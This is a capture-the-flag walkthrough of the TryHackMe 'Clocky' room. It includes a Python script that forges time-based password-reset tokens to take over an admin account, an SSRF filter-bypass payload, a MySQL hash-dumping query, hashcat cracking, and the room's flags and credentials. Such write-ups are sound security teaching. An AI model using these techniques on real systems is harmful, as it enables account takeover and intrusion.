---
date: 2024-04-10T13:03:18-05:00
# description: ""
image: "/images/THM-Clocky/clocky.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: Clocky"
type: "post"
---

* Platform: TryHackMe
* Link: [Clocky](https://tryhackme.com/r/room/clocky)
* Level: Medium
* OS: Linux
---

For this challenge our objective is to locate six flags. Our inital step involves examining the `robots.txt` file which contains some file extensions. By fuzzing with those file extensions we obtain an archive and extracting it yields the source code of an application. Upon reviewing the code we identify a way to manipulate the application's password reset mechanism, granting us access to the administrative dashboard. 

The dashboard presents a form vulnerable to Server-Side Request Forgery (SSRF), enabling us to acquire a file with plaintext passwords. By combining the user names we enumerate and the passwords, we get an initial foothold into the system via SSH. 

Further exploration reveals a mysql database; however attempting to read one of its table's content produces some indecipherable output because of the `cache_sha2_password` plugin's encryption. Eventually, using a meticulously crafted query, we successfully dump the password hashes in a legible format and after cracking them we get the root password.

Target IP  - `10.10.62.39`

## Scanning

```
nmap -sC -sV -oA nmap/Clocky 10.10.62.39
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 22:51 CDT
Nmap scan report for 10.10.62.39
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9:42:e0:c0:d0:a9:8a:c3:82:65:ab:1e:5c:9c:0d:ef (RSA)
|   256 ff:b6:27:d5:8f:80:2a:87:67:25:ef:93:a0:6b:5b:59 (ECDSA)
|_  256 e1:2f:4a:f5:6d:f1:c4:bc:89:78:29:72:0c:ec:32:d2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 3 disallowed entries 
|_/*.sql$ /*.zip$ /*.bak$
|_http-title: 403 Forbidden
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.02 seconds
```

We find three ports open 22 (SSH), 80 (HTTP - Apache) and 8000 (HTTP - Nginx). Both web servers seems to return a 403 status code.

## Flag 1

Both `http://10.10.62.39/` and `http://10.10.62.39:8000/` return `403 Fordbidden` as we could see in nmap.

![Apache 403 error](/images/THM-Clocky/Apache-403.png)

![Nginx 403 error](/images/THM-Clocky/Nginx-403.png)

From the nmap output we can see that the service on port 8000 has some disallowed entries for `robots.txt`. Visiting `http://10.10.62.39:8000/robots.txt`, we find a list of those same entries and flag 1.

![Clocky Flag 1](/images/THM-Clocky/flag1.png)

```
THM{14b45bb9eefdb584b79063eca6a31b7a}
```

---

## Flag 2

Directory enumeration on the first web server with gobuster is unfruitful, we switch to ffuf to fuzz for files.

We fuzz for all the extensions mentioned in `robots.txt`. Only `.zip` returns a result and we find `index`.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://10.10.62.39:8000/FUZZ.zip
```

![File fuzzing results](/images/THM-Clocky/ffuf-zip.png)

We get a file called `index.zip` after going to `http://10.10.62.39:8000/index.zip` and extracting the archive gives us flag 2.

![Clocky Flag 2](/images/THM-Clocky/flag2.png)

```
THM{1d3d62de34a3692518d03ec474159eaf}
```
---

## Flag 3

The archive also contains a python file `app.py`, which appears to be the source code for a Flask application. At the end of the code we see that the app is running on port `8080`.

![Flask app on port 8080](/images/THM-Clocky/flask-app-8080.png)

Navigating to `http://10.10.62.39:8080/` we get to a static website.

![Clocky website on port 8080](/images/THM-Clocky/clocky-website.png)

In the source code we find multiple endpoints such as:

* `/administrator` which has a login form.

![Clocky administrator endpoint](/images/THM-Clocky/administrator.png)

* `/forgot_password` which allows to reset a password after the user provides a valid username.

![Clocky forgot_password endpoint](/images/THM-Clocky/password-reset.png)

* `/password_reset`, this endpoint leads to a page with the message `Invalid Parameter`. In the code we see that we need to provide a token value.

![Clocky forgot_password endpoint](/images/THM-Clocky/pwd_reset.png)

![Clocky token value expected](/images/THM-Clocky/token-expected.png)

Moreover the generation of the token is time sensitive. Here is how it works:

* once the application confirms that the user name provided exists in the database it gets the server's current date and time and stores it in `value`.
* `value` is then converted into a string and the last 4 characters are removed. A space, a dot and the upper case version of the user name are then appended to the string.
* the `lnk` string is finally hashed using SHA-1 (which is insecure).

![Clocky token value expected](/images/THM-Clocky/token-gen-code.png)

So to exploit it we have to:

* provide a valid username 
* sync our date and time with the server's
* generate a valid token value 
* reset the password of the adminstrator account 


We use the script below to achieve it.

```python
import datetime
import hashlib
import requests
import re

# Set the target URL, change the IP acordingly
base_url = 'http://10.10.62.39:8080/' 

# Send a POST request to synchronize time
data = {"username": "administrator"}
requests.post(base_url + "forgot_password", data=data)

# Send a GET request to fetch the current time
response = requests.get(base_url)
if response.status_code == 200:
    time_pattern = r'The current time is (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})'
    match = re.search(time_pattern, response.text)
    if match:
        current_time_str = match.group(1)
        print("Synchronized time:", current_time_str)  

        # Generate and check valid tokens
        valid_tokens = []
        for ms in range(100):
            ms_str = str(ms).zfill(2)  
            token_data = current_time_str + "." + ms_str + " . " + "administrator".upper()
            hashed_token = hashlib.sha1(token_data.encode("utf-8")).hexdigest()
            response = requests.get(base_url + 'password_reset', params={'token': hashed_token})
            if '<h2>Invalid token</h2>' not in response.text:
                print(f'Generated token: {hashed_token}') 
                valid_tokens.append(hashed_token)

        print("Generated tokens:", valid_tokens) 
    else:
        print("Error: Could not parse server time from response.")
else:
    print("Error: Failed to fetch server response.")

```

Go to `/forgot_password` and input administrator.

![administrator account reset](/images/THM-Clocky/admin-reset.png)

After running the script we get a token value that we need to add to `/password_reset`.

![python script to generate valid token values](/images/THM-Clocky/clocky-py.png)

```
10.10.62.39:8080/password_reset?token=2233b063a0ebf5505e2cf32a7fa79937d9b561ed
```

Our token value is correct and we are able to reset the password of the user `administrator`.

![password reset success](/images/THM-Clocky/pwd-reset-success.png)

Going back to `/dashboard` we can login with `administrator:Password_you_picked` and we get the flag 3.

```
THM{ee68e42f755f6ebbcd89439432d7b462}
```

![admin dashboard](/images/THM-Clocky/admin-dashboard.png)

---

## Flag 4

On the Administrator Dashboard we can submit a `Location` and download a file. After capturing the request with Burp Suite we can see that it uses the `location` parameter.

It turns out to be vulnerable to SSRF.

> "A **Server-side Request Forgery (SSRF)** vulnerability occurs when an attacker manipulates a **server-side application** into making **HTTP requests** to a domain of their choice. This vulnerability exposes the server to arbitrary external requests directed by the attacker." Source - [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)


We can find plenty of payloads on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypassing-filters). I used `http://127.0.0.1:80` but it fails and we get `Action not permitted` in the response, implying that there is a filter that we need to bypass.

![SSRF test](/images/THM-Clocky/SSRF.png)

I found a SSRF cheat sheet [here](https://highon.coffee/blog/ssrf-cheat-sheet/) and the payload `http://0x7f000001/` works.

![SSRF working payload](/images/THM-Clocky/SSRF-payload.png)

At the beginning of the source code you can see the comment to execute `datbase.sql`. We use that for the file name and get a hit with the value for the flag 4.

![database.sql file comment](/images/THM-Clocky/db-sql.png)


![Flag 4](/images/THM-Clocky/flag4.png)

```
THM{350020dc1a53e50e1e92bac2c35dd0a2}
```


After forwarding the request we get a file called `file.txt`.

---

## Flag 5


> The hint for this flag is "Have you gathered any usernames yet?"

`file.txt` leaks the password `Th1s_1s_4_v3ry_s3cur3_p4ssw0rd` and the username `clocky_user`. The source code only mentions two other names `jane` and `clarice`. 

After trying the password with the different users we are able to login via SSH with `clarice:Th1s_1s_4_v3ry_s3cur3_p4ssw0rd` and grab flag 5.

![Flag 5](/images/THM-Clocky/flag5.png)

```
THM{e57dfa35e62d518cfd215dd7729d0877}
```

---

## Flag 6

In `/home/clarice/app` we find the hidden file `.env` which reveals the database password `seG3mY4F3tKCJ1Yj`.

![database password](/images/THM-Clocky/db-pwd.png)

The result of `ss -lntp` confirms that MySQL is running on the server.

![Internal services running](/images/THM-Clocky/services-intern.png)

Using `clocky_user:seG3mY4F3tKCJ1Yj` we connect to MySQL.

```
mysql -u clocky_user -p
```

The `clocky` database only contains the credentials of the `administrator` user. 

In the `mysql` database we find a `user` table. 

![mysql database](/images/THM-Clocky/mysql-db.png)

The query `select * from user` produced some illegible output.

> If you pay close attention, you can actually grab a password hash from the output but I doubt this is the intended way to get the flag.

![sql query output](/images/THM-Clocky/user-output.png)

In the output we repeatedly see `caching_sha2_password` which is an authentication plugin using sha256. 

Searching `how to dump mysql sha256 hashes with caching_sha2_password?` on Google we find this [hashcat issue page](https://github.com/hashcat/hashcat/issues/2305?source=post_page-----10e08ab0f1e9--------------------------------) where we can find multiple queries to achieve our goal.

```
SELECT user, CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
```
![hashes dump](/images/THM-Clocky/hashes-dump.png)

The first `dev` password hash gives the password `armadillo`.

```
hashcat -m 7401 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Using the newly found password we are able to connect as root and grab flag 6 in `/root` and that's all of them!

![Flag 6](/images/THM-Clocky/flag6.png)

This challenge was pretty interesting and I hope my write up was useful to you. I think knowing Python is becoming more and more valuable for technical security professionals and taking the time to learn it will probably pay massive dividends in the future. You can read Automate the Boring Stuff with Python by Al Sweigart for free [here](http://automatetheboringstuff.com/2e/).

